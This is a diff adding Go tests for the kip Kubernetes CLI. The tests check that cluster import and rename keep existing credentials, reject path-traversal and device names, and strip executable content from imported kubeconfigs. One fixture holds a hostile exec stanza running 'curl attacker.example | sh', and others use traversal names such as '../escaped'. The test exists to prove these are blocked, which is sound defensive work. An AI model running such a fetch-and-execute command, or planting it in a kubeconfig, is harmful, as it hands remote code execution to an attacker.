@@ -2,16 +2,20 @@ package cmd
 
 import (
 	"encoding/base64"
+	"errors"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"k8s.io/client-go/tools/clientcmd"
 
 	"github.com/getkipper/kipper/kip/internal/clusteridentity"
 	"github.com/getkipper/kipper/kip/internal/config"
+	"github.com/getkipper/kipper/kip/internal/installer"
 )
 
 // renameKubeconfigFile is path-sensitive — it only acts on files inside
@@ -386,7 +390,15 @@ current-context: old.example.com
 
 	content, err := os.ReadFile(kubeconfig)
 	require.NoError(t, err)
-	assert.Contains(t, string(content), "--cluster-domain\n          - new.example.com")
+	// Asserted through the parser rather than on the text: the pin is what the
+	// plugin is asked for, and a test that reads indentation fails on a
+	// re-render that changed nothing an operator can see.
+	reloaded, err := clientcmd.Load(content)
+	require.NoError(t, err)
+	user := reloaded.AuthInfos["oidc@new.example.com"]
+	require.NotNil(t, user)
+	require.NotNil(t, user.Exec)
+	assert.Equal(t, []string{"auth", "kubectl-token", "--cluster-domain", "new.example.com"}, user.Exec.Args)
 
 	saved, err := config.Load()
 	require.NoError(t, err)
@@ -842,4 +854,436 @@ contexts:
 
 	_, err := renameKubeconfigFile(filepath.Join(clusters, "shop.yaml"), "prod", "shop.example")
 	require.Error(t, err, "a file with no live context cannot identify itself")
+}
+
+// stageExistingKubeconfig puts a kubeconfig where an import of the "shop"
+// export would land, so a test can say what that import is about to replace.
+func stageExistingKubeconfig(t *testing.T, home, content string) string {
+	t.Helper()
+	clusters := filepath.Join(home, ".kip", "clusters")
+	require.NoError(t, os.MkdirAll(clusters, 0o700))
+	path := filepath.Join(clusters, "shop.yaml")
+	require.NoError(t, os.WriteFile(path, []byte(content), 0o600))
+	return path
+}
+
+// kipRenderedKubeconfig returns what kip itself writes for a cluster, so a test
+// staging "a file kip wrote" cannot drift from what kip actually writes.
+func kipRenderedKubeconfig(t *testing.T, server string) string {
+	t.Helper()
+	source := `apiVersion: v1
+kind: Config
+clusters:
+- name: c
+  cluster: {server: "` + server + `", certificate-authority-data: Y2EtcGVt}
+users:
+- name: u
+  user: {}
+contexts:
+- name: c
+  context: {cluster: c, user: u}
+current-context: c
+`
+	rendered, err := installer.RenderImportedKubeconfig("shop.example", source)
+	require.NoError(t, err)
+	return rendered
+}
+
+const adminCertKubeconfig = `apiVersion: v1
+kind: Config
+clusters:
+- name: shop
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+- name: shop
+  user: {client-certificate-data: Y2VydA==, client-key-data: a2V5}
+contexts:
+- name: shop
+  context: {cluster: shop, user: shop}
+current-context: shop
+`
+
+// The defect this pins: an import wrote its credential-free kubeconfig over
+// whatever was at that path. On a machine holding the cluster's admin
+// certificate, that is the only credential reaching the cluster, and the export
+// cannot reissue it.
+func TestClusterAddKeepsACredentialItCannotReissue(t *testing.T) {
+	home := withFakeHome(t)
+	path := stageExistingKubeconfig(t, home, adminCertKubeconfig)
+
+	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), path, "the refusal has to name the file it would have replaced")
+
+	content, readErr := os.ReadFile(path)
+	require.NoError(t, readErr)
+	assert.Equal(t, adminCertKubeconfig, string(content), "the credential survives the refused import")
+
+	cfg, loadErr := config.Load()
+	require.NoError(t, loadErr)
+	assert.Nil(t, cfg.GetCluster("shop"), "a refused import writes no entry either")
+}
+
+// Re-importing an updated export is the ordinary way to pick up a changed
+// domain, and the file it replaces there carries no credential at all.
+func TestClusterAddReplacesItsOwnCredentialFreeKubeconfig(t *testing.T) {
+	home := withFakeHome(t)
+	path := stageExistingKubeconfig(t, home, kipRenderedKubeconfig(t, "https://198.51.100.9:6443"))
+
+	require.NoError(t, runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)}))
+
+	content, err := os.ReadFile(path)
+	require.NoError(t, err)
+	assert.Contains(t, string(content), "203.0.113.10", "the import's server address lands")
+	assert.NotContains(t, string(content), "198.51.100.9")
+}
+
+// Another tool's plugin holds a credential kip never issued and cannot reissue,
+// so it is no more replaceable than a certificate.
+func TestClusterAddKeepsAnotherToolsCredentialPlugin(t *testing.T) {
+	home := withFakeHome(t)
+	foreign := `apiVersion: v1
+kind: Config
+clusters:
+- name: shop
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+- name: eks
+  user:
+    exec:
+      apiVersion: client.authentication.k8s.io/v1beta1
+      command: aws
+      args: ["eks", "get-token", "--cluster-name", "shop"]
+contexts:
+- name: shop
+  context: {cluster: shop, user: eks}
+current-context: shop
+`
+	path := stageExistingKubeconfig(t, home, foreign)
+
+	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+	require.Error(t, err)
+	content, readErr := os.ReadFile(path)
+	require.NoError(t, readErr)
+	assert.Equal(t, foreign, string(content))
+}
+
+// An export is a file someone sent you, and its name becomes a path under
+// ~/.kip/clusters. A name carrying a parent reference would put the file
+// wherever its author chose.
+func TestClusterAddRefusesANameThatIsAPath(t *testing.T) {
+	home := withFakeHome(t)
+
+	// An empty name is refused earlier, by the export's own completeness check.
+	for _, name := range []string{"../escaped", "sub/dir", "..", ".hidden"} {
+		bundle := filepath.Join(home, "export.yaml")
+		body, err := os.ReadFile(exportBundle(t, home))
+		require.NoError(t, err)
+		//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
+		require.NoError(t, os.WriteFile(bundle,
+			[]byte(strings.Replace(string(body), "name: shop", "name: "+name, 1)), 0o600))
+
+		err = runClusterAdd(clusterAddCmd, []string{bundle})
+		require.Error(t, err, "name %q must be refused", name)
+		assert.Contains(t, err.Error(), "not usable")
+	}
+
+	_, err := os.Stat(filepath.Join(filepath.Dir(home), "escaped.yaml"))
+	assert.True(t, errors.Is(err, os.ErrNotExist), "nothing may be written outside the clusters directory")
+}
+
+// A refresh token in auth-provider config, or a basic-auth password, is a
+// credential like any other. Reading only certificates and tokens meant an
+// import replaced these as if the file were empty.
+func TestClusterAddKeepsCredentialsThatAreNotCertificates(t *testing.T) {
+	for name, users := range map[string]string{
+		"basic auth": `- name: shop
+  user: {username: admin, password: hunter2}`,
+		"auth provider": `- name: shop
+  user:
+    auth-provider:
+      name: oidc
+      config: {refresh-token: r3fr3sh, idp-issuer-url: "https://issuer.example"}`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			home := withFakeHome(t)
+			content := `apiVersion: v1
+kind: Config
+clusters:
+- name: shop
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+` + users + `
+contexts:
+- name: shop
+  context: {cluster: shop, user: shop}
+current-context: shop
+`
+			path := stageExistingKubeconfig(t, home, content)
+
+			err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+			require.Error(t, err)
+			after, readErr := os.ReadFile(path)
+			require.NoError(t, readErr)
+			assert.Equal(t, content, string(after))
+		})
+	}
+}
+
+// The same blind spot on the way in: an export carrying one of these was
+// accepted as credential-free, against that check's own contract.
+func TestRejectEmbeddedCredentialCoversEveryCredentialForm(t *testing.T) {
+	//nolint:gosec // G101: invented values in a fixture, not a credential
+	for name, user := range map[string]string{
+		"basic auth":    "  user: {username: admin, password: hunter2}",
+		"auth provider": "  user:\n    auth-provider:\n      name: oidc",
+		"token":         "  user: {token: abcdef}",
+		"certificate":   "  user: {client-certificate-data: Y2VydA==}",
+	} {
+		t.Run(name, func(t *testing.T) {
+			err := rejectEmbeddedCredential([]byte(`apiVersion: v1
+kind: Config
+users:
+- name: someone
+` + user + "\n"))
+			assert.Error(t, err, "an export carrying %s is not credential-free", name)
+		})
+	}
+}
+
+// Two config entries over one file is one cluster's credentials answering for
+// another, which is what "Shop" and "shop" are on a case-folding filesystem.
+func TestClusterAddRefusesAPathAnotherClusterOwns(t *testing.T) {
+	home := withFakeHome(t)
+	clusters := filepath.Join(home, ".kip", "clusters")
+	require.NoError(t, os.MkdirAll(clusters, 0o700))
+	require.NoError(t, config.Save(&config.Config{
+		Clusters: []config.Cluster{
+			{Name: "SHOP", Domain: "other.example", Kubeconfig: filepath.Join(clusters, "shop.yaml")},
+		},
+	}))
+
+	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "SHOP", "the refusal names the cluster that already owns the file")
+}
+
+func TestClusterAddRefusesAWindowsDeviceName(t *testing.T) {
+	home := withFakeHome(t)
+	body, err := os.ReadFile(exportBundle(t, home))
+	require.NoError(t, err)
+	bundle := filepath.Join(home, "con-export.yaml")
+	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
+	require.NoError(t, os.WriteFile(bundle,
+		[]byte(strings.Replace(string(body), "name: shop", "name: CON", 1)), 0o600))
+
+	err = runClusterAdd(clusterAddCmd, []string{bundle})
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "reserved device name")
+}
+
+// The name reaching a path is not only the import's problem: rename builds the
+// same path from a name a caller supplies.
+func TestClusterRenameRefusesANameThatIsAPath(t *testing.T) {
+	home := withFakeHome(t)
+	path := stageExistingKubeconfig(t, home, adminCertKubeconfig)
+	require.NoError(t, config.Save(&config.Config{
+		CurrentCluster: "shop",
+		Clusters:       []config.Cluster{{Name: "shop", Domain: "shop.example", Kubeconfig: path}},
+	}))
+
+	err := runClusterRename(clusterRenameCmd, []string{"shop", "../../outside"})
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "not usable")
+	_, statErr := os.Stat(path)
+	assert.NoError(t, statErr, "the kubeconfig stays where it was")
+	_, escaped := os.Stat(filepath.Join(filepath.Dir(home), "outside.yaml"))
+	assert.True(t, errors.Is(escaped, os.ErrNotExist), "and nothing lands outside the managed directory")
+}
+
+// A kubeconfig is not only data: an exec stanza names a command client-go runs
+// as soon as anything asks for credentials, and an import is a file a colleague
+// sent you. Nothing executable from that file may reach the disk.
+func TestClusterAddRendersItsOwnKubeconfigRatherThanTheOneItWasSent(t *testing.T) {
+	home := withFakeHome(t)
+	hostile := `apiVersion: v1
+kind: Config
+clusters:
+- name: c
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+- name: operator
+  user:
+    exec:
+      apiVersion: client.authentication.k8s.io/v1
+      command: sh
+      args: ["-c", "curl attacker.example | sh"]
+contexts:
+- name: c
+  context: {cluster: c, user: operator}
+current-context: c
+`
+	bundle := filepath.Join(home, "hostile.kip")
+	body := "name: shop\nprovider: baremetal\nhost: 203.0.113.10\ndomain: shop.example\nkubeconfig: |\n"
+	encoded := base64.StdEncoding.EncodeToString([]byte(hostile))
+	for i := 0; i < len(encoded); i += 76 {
+		body += "  " + encoded[i:min(i+76, len(encoded))] + "\n"
+	}
+	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
+	require.NoError(t, os.WriteFile(bundle, []byte(body), 0o600))
+
+	require.NoError(t, runClusterAdd(clusterAddCmd, []string{bundle}))
+
+	written, err := os.ReadFile(filepath.Join(home, ".kip", "clusters", "shop.yaml"))
+	require.NoError(t, err)
+	assert.NotContains(t, string(written), "attacker.example", "nothing the sender chose to run may land")
+	assert.NotContains(t, string(written), "command: sh")
+
+	// Asserted through the parser: what kip renders as its command depends on
+	// whether kip is on PATH, and a test that reads the literal "kip" passes or
+	// fails on the machine's PATH rather than on the code.
+	parsed, err := clientcmd.Load(written)
+	require.NoError(t, err)
+	user := parsed.AuthInfos["oidc@shop.example"]
+	require.NotNil(t, user)
+	require.NotNil(t, user.Exec)
+	assert.True(t, installer.IsExactlyKipExec(user), "what lands is the plugin kip renders")
+	assert.Equal(t, []string{"auth", "kubectl-token", "--cluster-domain", "shop.example"}, user.Exec.Args)
+	assert.Equal(t, "https://203.0.113.10:6443", parsed.Clusters["shop.example"].Server, "the server address is kept")
+	assert.Equal(t, []byte("ca-pem"), parsed.Clusters["shop.example"].CertificateAuthorityData, "and the cluster authority")
+}
+
+// The import replaces the whole file, so a credential parked in a context
+// nobody is using is lost exactly as completely as the one in front of it.
+func TestClusterAddKeepsACredentialInAnInactiveContext(t *testing.T) {
+	home := withFakeHome(t)
+	// A kip-rendered file with a break-glass certificate parked beside it, in a
+	// context nobody is using.
+	content := kipRenderedKubeconfig(t, "https://203.0.113.10:6443") + `- name: breakglass
+  user:
+    client-certificate-data: Y2VydA==
+    client-key-data: a2V5
+`
+	path := stageExistingKubeconfig(t, home, content)
+
+	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "breakglass", "the refusal names the entry that would have been lost")
+	after, readErr := os.ReadFile(path)
+	require.NoError(t, readErr)
+	assert.Equal(t, content, string(after))
+}
+
+func TestClusterAddRefusesADeviceNameWithAnExtension(t *testing.T) {
+	home := withFakeHome(t)
+	body, err := os.ReadFile(exportBundle(t, home))
+	require.NoError(t, err)
+	bundle := filepath.Join(home, "dev-export.yaml")
+	//nolint:gosec // G703: bundle is a fixed path inside the test's temp home
+	require.NoError(t, os.WriteFile(bundle,
+		[]byte(strings.Replace(string(body), "name: shop", "name: CON.backup", 1)), 0o600))
+
+	err = runClusterAdd(clusterAddCmd, []string{bundle})
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "reserved device name")
+}
+
+// The loose "looks like kip" test was enough to decide a stale pin. It is not
+// enough to decide destruction: a wrapper named kip, extra arguments, or
+// environment the operator added all authenticate someone, and an export
+// reproduces none of them.
+func TestClusterAddKeepsAPluginThatOnlyResemblesKips(t *testing.T) {
+	for name, user := range map[string]string{
+		"a wrapper elsewhere": `      command: /opt/company/kip
+      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]`,
+		"extra arguments": `      command: kip
+      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example", "--profile", "work"]`,
+		"operator environment": `      command: kip
+      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
+      env:
+        - name: KIP_PROFILE
+          value: work`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			home := withFakeHome(t)
+			content := `apiVersion: v1
+kind: Config
+clusters:
+- name: shop
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+- name: oidc@shop.example
+  user:
+    exec:
+      apiVersion: client.authentication.k8s.io/v1
+      interactiveMode: Never
+` + user + `
+contexts:
+- name: shop
+  context: {cluster: shop, user: oidc@shop.example}
+current-context: shop
+`
+			path := stageExistingKubeconfig(t, home, content)
+
+			err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+			require.Error(t, err)
+			after, readErr := os.ReadFile(path)
+			require.NoError(t, readErr)
+			assert.Equal(t, content, string(after))
+		})
+	}
+}
+
+// macOS and Windows fold case, so Stat finds Shop.yaml when asked for
+// shop.yaml. Reading that as a collision makes normalising a name impossible on
+// the machines operators use.
+func TestClusterRenameAllowsACaseOnlyChange(t *testing.T) {
+	home := withFakeHome(t)
+	clusters := filepath.Join(home, ".kip", "clusters")
+	require.NoError(t, os.MkdirAll(clusters, 0o700))
+	oldPath := filepath.Join(clusters, "Shop.yaml")
+	require.NoError(t, os.WriteFile(oldPath, []byte(kipRenderedKubeconfig(t, "https://203.0.113.10:6443")), 0o600))
+
+	newPath, err := renameKubeconfigFile(oldPath, "shop", "shop.example")
+
+	require.NoError(t, err)
+	assert.Equal(t, filepath.Join(clusters, "shop.yaml"), newPath)
+}
+
+// An older kip's file carries no secret, and telling the operator it holds a
+// credential sends them looking for something that was never there.
+func TestClusterAddSaysWhenAKipPluginIsSimplyUnfamiliar(t *testing.T) {
+	home := withFakeHome(t)
+	path := stageExistingKubeconfig(t, home, `apiVersion: v1
+kind: Config
+clusters:
+- name: shop
+  cluster: {server: "https://203.0.113.10:6443", certificate-authority-data: Y2EtcGVt}
+users:
+- name: oidc@shop.example
+  user:
+    exec:
+      apiVersion: client.authentication.k8s.io/v1beta1
+      command: kip
+      args: ["auth", "kubectl-token", "--cluster-domain", "shop.example"]
+contexts:
+- name: shop
+  context: {cluster: shop, user: oidc@shop.example}
+current-context: shop
+`)
+
+	err := runClusterAdd(clusterAddCmd, []string{exportBundle(t, home)})
+
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "this build did not write")
+	assert.NotContains(t, err.Error(), "an export cannot reissue")
+	_, statErr := os.Stat(path)
+	assert.NoError(t, statErr)
 }
